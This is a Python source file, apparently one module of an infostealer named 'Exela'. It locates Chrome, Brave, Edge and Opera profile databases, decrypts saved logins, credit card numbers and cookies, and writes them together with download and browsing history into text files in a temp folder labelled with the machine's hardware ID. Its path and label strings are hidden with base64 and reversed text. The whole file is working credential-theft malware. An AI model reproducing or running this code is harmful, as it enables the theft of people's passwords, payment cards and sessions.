import shutil, os
import sqlite3 as database3
import base64, encKey, decryption
import tools.write_text
import genHwid

count = 0
CCcount = 0
CookieCount = 0
DownloadsCount = 0
HistoryCount = 0


serialNumber = genHwid.Gen().get_hwid_number() 

quica = encKey.getKey()
quicaa = decryption.quicka()

class Chromium:
    def __init__(self) -> None:
        self.compname = os.getenv("computername")
        self.extantion = ".db"
        self.zink = base64.b64decode("VXNlciBEYXRh==").decode()
        self.zink2 = base64.b64decode("TG9naW4gRGF0YQ==").decode()
        self.zink3 = base64.b64decode("V2ViIERhdGE==").decode()
        self.zink4 = base64.b64decode("SGlzdG9yeQ==").decode()
        self.zink5 = base64.b64decode("TmV0d29yaw==").decode()
        self.zink6 = base64.b64decode("Q29va2llcw==").decode()
        self.newFileName = "Exela" + self.extantion
        self.createDirectory()
        tools.write_text.main("drowssaP")
        tools.write_text.main("sdraC tiderC")
        tools.write_text.main("seikooC")
        tools.write_text.main("sdaolnwoD")
        tools.write_text.main("yrotsiH")
        self.callback()
    def createDirectory(self):
        try:
            currentDirectory = os.environ["temp"] + f"\\{serialNumber}__{self.compname}"
            value = "drowssaP"[::-1]
            value2 = "sdraC tiderC"[::-1]
            value3 = "seikooC"[::-1]
            value4 = "sdaolnwoD"[::-1]
            value5 = "yrotsiH"[::-1]
            try:
                os.mkdir(currentDirectory + f"\\{value}")
                os.mkdir(currentDirectory + f"\\{value2}")
                os.mkdir(currentDirectory + f"\\{value3}")
                os.mkdir(currentDirectory + f"\\{value4}")
                os.mkdir(currentDirectory + f"\\{value5}")
            except:
                pass
        except:
            pass
    def safeBrowsers(self, path, filee, profile):
        try:
            if not os.path.isdir(os.getenv("localappdata")+ f"\\{path}\\{filee}\\{self.zink}\\{profile}"):
                return
            else:
                global count
                self.copy(path, filee, profile, self.zink2)
                exela = database3.connect(os.getenv("localappdata") + "\\" + self.newFileName)
                cursor = exela.cursor()
                cursor.execute("select origin_url, action_url, username_value, password_value from logins")
                for Exela in cursor.fetchall():
                    value = Exela[0]
                    value2 = Exela[1]
                    value3 = Exela[2]
                    quicaxd = quicaa.mainFunc(Exela[3], quica.getkey(os.getenv("localappdata") + f"\\{path}\\{filee}", "User Data"))
                    if quicaxd:
                        count += 1
                        variable0 = "LRU nigirO"[::-1]
                        variable2 = "LRU noitcA"[::-1]
                        variable3 = "emanresU"[::-1]
                        variable = "drowssaP"[::-1]
                        variable4 = "resworB"[::-1]
                        tools.write_text.Write(os.getenv("temp") + f"\\{serialNumber}__{self.compname}\\{variable}\\{variable}.txt", f"{variable0} : {value}")
                        tools.write_text.Write(os.getenv("temp") + f"\\{serialNumber}__{self.compname}\\{variable}\\{variable}.txt", f"{variable2} : {value2}")
                        tools.write_text.Write(os.getenv("temp") + f"\\{serialNumber}__{self.compname}\\{variable}\\{variable}.txt", f"{variable3} : {value3}")
                        tools.write_text.Write(os.getenv("temp") + f"\\{serialNumber}__{self.compname}\\{variable}\\{variable}.txt", f"{variable} : {quicaxd}")
                        tools.write_text.Write(os.getenv("temp") + f"\\{serialNumber}__{self.compname}\\{variable}\\{variable}.txt", variable4 + " : " + path + "_" + filee + "_" + profile)
                    else:
                        continue
                    tools.write_text.Write(os.getenv("temp") + f"\\{serialNumber}__{self.compname}\\{variable}\\{variable}.txt", "="*50)
                try:
                    cursor.close()
                    exela.close()
                    os.remove(os.getenv("localappdata") + f"\\{self.newFileName}")
                except:
                    pass
        except:
            pass
    def safeBrowserCC(self, path, filee, profile):
        try:
            if not os.path.isdir(os.getenv("localappdata")+ f"\\{path}\\{filee}\\{self.zink}\\{profile}"):
                return
            else:
                global CCcount
                exelaa = "sdraC tiderC"[::-1]
                self.copy(path, filee,profile, self.zink3)
                exela = database3.connect(os.getenv("localappdata") + "\\" + self.newFileName)
                cursor = exela.cursor()
                cursor.execute("select card_number_encrypted, expiration_year, expiration_month, name_on_card from credit_cards")
                for Exela in cursor.fetchall():
                    value = quicaa.mainFunc(Exela[0], quica.getkey(os.getenv("localappdata") + f"\\{path}\\{filee}", self.zink))
                    value1 = Exela[1]
                    value2 = Exela[2]
                    value3 = Exela[3]
                    if value:
                        CCcount += 1
                        tools.write_text.Write(os.getenv("temp") + f"\\{serialNumber}__{self.compname}\\{exelaa}\\{exelaa}.txt", f"{value} {value2}/{value1} {value3}")
                    else:
                        continue
            try:
                cursor.close()
                exela.close()
                os.remove(os.getenv("localappdata") + "\\" + self.newFileName)
            except:
                pass
        except:
            pass
    def safeBrowserCookie(self, path, filee, profile):
        try:
            if not os.path.isdir(os.getenv("localappdata")+ f"\\{path}\\{filee}\\{self.zink}\\{profile}"):
                return
            else:
                global CookieCount
                exelaa = "seikooC"[::-1]
                shutil.copyfile(os.getenv("localappdata") + f"\\{path}\\{filee}\\{self.zink}\\{profile}\\{self.zink5}\\{self.zink6}", os.getenv("localappdata") + "\\" + self.newFileName)
                exela = database3.connect(os.getenv("localappdata") + "\\" + self.newFileName)
                cursor = exela.cursor()
                cursor.execute("select host_key, name, path, encrypted_value,expires_utc from cookies")
                for Exela in cursor.fetchall():
                    value = Exela[0]
                    value1 = Exela[1]
                    value2 = Exela[2]
                    quicaxdd = quicaa.mainFunc(Exela[3], quica.getkey(os.getenv("localappdata") + f"\\{path}\\{filee}", self.zink))
                    value3 = Exela[4]
                    entry = ""
                    entry2 = ""
                    if quicaxdd:
                        CookieCount += 1
                        if value3 == 0:
                            entry = "FALSE"
                        else:
                            entry = "TRUE"
                        if value.startswith("."):
                            entry2 = "FALSE"
                        else:
                            entry2 = "TRUE"
                        tools.write_text.Write(os.getenv("temp") + f"\\{serialNumber}__{self.compname}\\{exelaa}\\{exelaa}.txt", f"{value}\t{entry}\{value2}\t{entry2}\t{value1}\t{quicaxdd}")
                try:
                    cursor.close()
                    exela.close()
                    os.remove(os.getenv("localappdata") + "\\" + self.newFileName)
                except Exception as e:
                    pass
        except:
            pass
    def safeBrowserDownLoads(self, path, filee, profile):
        try:
            if not os.path.isdir(os.getenv("localappdata")+ f"\\{path}\\{filee}\\{self.zink}\\{profile}"):
                return
            else:
                global DownloadsCount
                exelaa = "sdaolnwoD"[::-1]
                exela = database3.connect(os.getenv("localappdata") + "\\" + self.newFileName)
                cursor = exela.cursor()
                cursor.execute("select tab_url, target_path from downloads")
                for Exela in cursor.fetchall():
                    value = Exela[0]
                    value1 = Exela[1]
                    if value or value1:
                        DownloadsCount += 1
                        tools.write_text.Write(os.getenv("temp") + f"\\{serialNumber}__{self.compname}\\{exelaa}\\{exelaa}.txt", f"{value} => {value1}")
                    else:
                        pass
            try:
                cursor.close()
                exela.close()
                os.remove(os.getenv("localappdata") + "\\" + self.newFileName)
            except:
                pass  
        except:
            pass
    def safeBrowserHistory(self, path, filee, profile):
        try:
            if not os.path.isdir(os.getenv("localappdata")+ f"\\{path}\\{filee}\\{self.zink}\\{profile}"):
                return
            else:
                global HistoryCount
                exelaa = "yrotsiH"[::-1]
                self.copy(path, filee,profile, self.zink4)
                exela = database3.connect(os.getenv("localappdata") + "\\" + self.newFileName)
                cursor = exela.cursor()
                cursor.execute("select url from urls")
                for Exela in cursor.fetchall():
                    Url = Exela[0]
                    if Url:
                        HistoryCount += 1
                        tools.write_text.Write(os.getenv("temp") + f"\\{serialNumber}__{self.compname}\\{exelaa}\\{exelaa}.txt", f"{Url}")
                    else:
                        continue
            try:
                cursor.close()
                exela.close()
            except:
                pass
        except:
            pass
    def copy(self, path, filee, profile, file_path):
        try:
            shutil.copyfile(os.getenv("localappdata") + f"\\{path}\\{filee}\\{self.zink}\\{profile}\\{file_path}", os.getenv("localappdata") + "\\" + self.newFileName)
        except:
            pass
    def callback(self):
        self.safeBrowsers("Google", "Chrome", "Default")
        self.safeBrowserCC("Google", "Chrome", "Default")
        self.safeBrowserCookie("Google", "Chrome", "Default")
        self.safeBrowserHistory("Google", "Chrome", "Default")
        self.safeBrowserDownLoads("Google", "Chrome", "Default")
        self.safeBrowsers("BraveSoftware", "Brave-Browser", "Default")
        self.safeBrowserCC("BraveSoftware", "Brave-Browser", "Default")
        self.safeBrowserCookie("BraveSoftware", "Brave-Browser", "Default")
        self.safeBrowserHistory("BraveSoftware", "Brave-Browser", "Default")
        self.safeBrowserDownLoads("BraveSoftware", "Brave-Browser", "Default")
        self.safeBrowsers("Microsoft", "Edge", "Default")
        self.safeBrowserCC("Microsoft", "Edge", "Default")
        self.safeBrowserCookie("Microsoft", "Edge", "Default")
        self.safeBrowserHistory("Microsoft", "Edge", "Default")
        self.safeBrowserDownLoads("Microsoft", "Edge", "Default")
        for exela2023 in range(50):
            self.safeBrowsers("Google", "Chrome", f"Profile {str(exela2023)}")
            self.safeBrowserCC("Google", "Chrome", f"Profile {str(exela2023)}")
            self.safeBrowserCookie("Google", "Chrome", f"Profile {str(exela2023)}")
            self.safeBrowserHistory("Google", "Chrome", f"Profile {str(exela2023)}")
            self.safeBrowserDownLoads("Google", "Chrome", f"Profile {str(exela2023)}")
            self.safeBrowsers("BraveSoftware", "Brave-Browser", f"Profile {str(exela2023)}")
            self.safeBrowserCC("BraveSoftware", "Brave-Browser", f"Profile {str(exela2023)}")
            self.safeBrowserCookie("BraveSoftware", "Brave-Browser", f"Profile {str(exela2023)}")
            self.safeBrowserHistory("BraveSoftware", "Brave-Browser", f"Profile {str(exela2023)}")
            self.safeBrowserDownLoads("BraveSoftware", "Brave-Browser", f"Profile {str(exela2023)}")
            self.safeBrowsers("Microsoft", "Edge", f"Profile {str(exela2023)}")
            self.safeBrowserCC("Microsoft", "Edge", f"Profile {str(exela2023)}")
            self.safeBrowserCookie("Microsoft", "Edge", f"Profile {str(exela2023)}")
            self.safeBrowserHistory("Microsoft", "Edge", f"Profile {str(exela2023)}")
            self.safeBrowserDownLoads("Microsoft", "Edge", f"Profile {str(exela2023)}")
            
class Opera:
    def __init__(self) -> None:
        self.compname = os.getenv("computername")
        self.extantion = ".db"
        self.zink = base64.b64decode("VXNlciBEYXRh==").decode()
        self.zink2 = base64.b64decode("TG9naW4gRGF0YQ==").decode()
        self.zink3 = base64.b64decode("V2ViIERhdGE==").decode()
        self.zink4 = base64.b64decode("SGlzdG9yeQ==").decode()
        self.zink5 = base64.b64decode("TmV0d29yaw==").decode()
        self.zink6 = base64.b64decode("Q29va2llcw==").decode()
        self.newFileName = "Exela" + self.extantion
        self.safeBrowsers("Opera Software", "Opera GX Stable")
        self.safeBrowserCC("Opera Software", "Opera GX Stable")
        self.safeBrowserCookie("Opera Software", "Opera GX Stable")
        self.safeBrowserHistory("Opera Software", "Opera GX Stable")
        self.safeBrowserDownLoads("Opera Software", "Opera GX Stable")
        self.safeBrowsers("Opera Software", "Opera Stable")
        self.safeBrowserCC("Opera Software", "Opera Stable")
        self.safeBrowserCookie("Opera Software", "Opera Stable")
        self.safeBrowserHistory("Opera Software", "Opera Stable")
        self.safeBrowserDownLoads("Opera Software", "Opera Stable")
    def safeBrowsers(self, path, filee):
        try:
            if not os.path.isdir(os.getenv("appdata")+ f"\\{path}\\{filee}"):
                return
            else:
                global count
                self.copy(path, filee, self.zink2)
                exela = database3.connect(os.getenv("appdata") + "\\" + self.newFileName)
                cursor = exela.cursor()
                cursor.execute("select origin_url, action_url, username_value, password_value from logins")
                for Exela in cursor.fetchall():
                    value = Exela[0]
                    value2 = Exela[1]
                    value3 = Exela[2]
                    quicaxd = quicaa.mainFunc(Exela[3], quica.getkey(os.getenv("appdata") + f"\\{path}\\{filee}", ""))
                    if quicaxd:
                        count += 1
                        variable0 = "LRU nigirO"[::-1]
                        variable2 = "LRU noitcA"[::-1]
                        variable3 = "emanresU"[::-1]
                        variable = "drowssaP"[::-1]
                        variable4 = "resworB"[::-1]
                        tools.write_text.Write(os.getenv("temp") + f"\\{serialNumber}__{self.compname}\\{variable}\\{variable}.txt", f"{variable0} : {value}")
                        tools.write_text.Write(os.getenv("temp") + f"\\{serialNumber}__{self.compname}\\{variable}\\{variable}.txt", f"{variable2} : {value2}")
                        tools.write_text.Write(os.getenv("temp") + f"\\{serialNumber}__{self.compname}\\{variable}\\{variable}.txt", f"{variable3} : {value3}")
                        tools.write_text.Write(os.getenv("temp") + f"\\{serialNumber}__{self.compname}\\{variable}\\{variable}.txt", f"{variable} : {quicaxd}")
                        tools.write_text.Write(os.getenv("temp") + f"\\{serialNumber}__{self.compname}\\{variable}\\{variable}.txt", variable4 + " : " + path + "_" + filee)
                    else:
                        continue
                    tools.write_text.Write(os.getenv("temp") + f"\\{serialNumber}__{self.compname}\\{variable}\\{variable}.txt", "="*50)
                try:
                    cursor.close()
                    exela.close()
                    os.remove(os.getenv("appdata") + f"\\{self.newFileName}")
                except:
                    pass
        except:
            pass
    def safeBrowserCC(self, path, filee):
        try:
            if not os.path.isdir(os.getenv("appdata")+ f"\\{path}\\{filee}"):
                return
            else:
                global CCcount
                exelaa = "sdraC tiderC"[::-1]
                self.copy(path, filee, self.zink3)
                exela = database3.connect(os.getenv("appdata") + "\\" + self.newFileName)
                cursor = exela.cursor()
                cursor.execute("select card_number_encrypted, expiration_year, expiration_month, name_on_card from credit_cards")
                for Exela in cursor.fetchall():
                    value = quicaa.mainFunc(Exela[0], quica.getkey(os.getenv("appdata") + f"\\{path}\\{filee}", ""))
                    value1 = Exela[1]
                    value2 = Exela[2]
                    value3 = Exela[3]
                    if value:
                        CCcount += 1
                        tools.write_text.Write(os.getenv("temp") + f"\\{serialNumber}__{self.compname}\\{exelaa}\\{exelaa}.txt", f"{value} {value2}/{value1} {value3}")
                    else:
                        pass
            try:
                cursor.close()
                exela.close()
                os.remove(os.getenv("appdata") + "\\" + self.newFileName)
            except:
                pass
        except:
            pass
    def safeBrowserCookie(self, path, filee):
        try:
            if not os.path.isdir(os.getenv("appdata")+ f"\\{path}\\{filee}"):
                return
            else:
                global CookieCount
                exelaa = "seikooC"[::-1]
                shutil.copyfile(os.getenv("appdata") + f"\\{path}\\{filee}\\{self.zink5}\\{self.zink6}", os.getenv("appdata") + "\\" + self.newFileName)
                exela = database3.connect(os.getenv("appdata") + "\\" + self.newFileName)
                cursor = exela.cursor()
                cursor.execute("select host_key, name, path, encrypted_value,expires_utc from cookies")
                for Exela in cursor.fetchall():
                    value = Exela[0]
                    value1 = Exela[1]
                    value2 = Exela[2]
                    quicaxdd = quicaa.mainFunc(Exela[3], quica.getkey(os.getenv("appdata") + f"\\{path}\\{filee}", ""))
                    value3 = Exela[4]
                    entry = ""
                    entry2 = ""
                    if quicaxdd:
                        CookieCount += 1
                        if value3 == 0:
                            entry = "FALSE"
                        else:
                            entry = "TRUE"
                        if value.startswith("."):
                            entry2 = "FALSE"
                        else:
                            entry2 = "TRUE"
                        tools.write_text.Write(os.getenv("temp") + f"\\{serialNumber}__{self.compname}\\{exelaa}\\{exelaa}.txt", f"{value}\t{entry}\{value2}\t{entry2}\t{value1}\t{quicaxdd}")
                try:
                    cursor.close()
                    exela.close()
                    os.remove(os.getenv("appdata") + "\\" + self.newFileName)
                except Exception as e:
                    pass
        except:
            pass
    def safeBrowserDownLoads(self, path, filee):
        try:
            if not os.path.isdir(os.getenv("appdata")+ f"\\{path}\\{filee}"):
                return
            else:
                global DownloadsCount
                exelaa = "sdaolnwoD"[::-1]
                exela = database3.connect(os.getenv("appdata") + "\\" + self.newFileName)
                cursor = exela.cursor()
                cursor.execute("select tab_url, target_path from downloads")
                for Exela in cursor.fetchall():
                    value = Exela[0]
                    value1 = Exela[1]
                    if value or value1:
                        DownloadsCount += 1
                        tools.write_text.Write(os.getenv("temp") + f"\\{serialNumber}__{self.compname}\\{exelaa}\\{exelaa}.txt", f"{value} => {value1}")
                    else:
                        pass
            try:
                cursor.close()
                exela.close()
                os.remove(os.getenv("appdata") + "\\" + self.newFileName)
            except:
                pass  
        except:
            pass
    def safeBrowserHistory(self, path, filee):
        try:
            if not os.path.isdir(os.getenv("appdata")+ f"\\{path}\\{filee}"):
                return
            else:
                global HistoryCount
                exelaa = "yrotsiH"[::-1]
                self.copy(path, filee, self.zink4)
                exela = database3.connect(os.getenv("appdata") + "\\" + self.newFileName)
                cursor = exela.cursor()
                cursor.execute("select url from urls")
                for Exela in cursor.fetchall():
                    Url = Exela[0]
                    if Url:
                        HistoryCount += 1
                        tools.write_text.Write(os.getenv("temp") + f"\\{serialNumber}__{self.compname}\\{exelaa}\\{exelaa}.txt", f"{Url}")
                    else:
                        continue
            try:
                cursor.close()
                exela.close()
            except:
                pass
        except:
            pass
    def copy(self, path, filee, file_path):
        try:
            shutil.copyfile(os.getenv("appdata") + f"\\{path}\\{filee}\\{file_path}", os.getenv("appdata") + "\\" + self.newFileName)
        except:
            pass
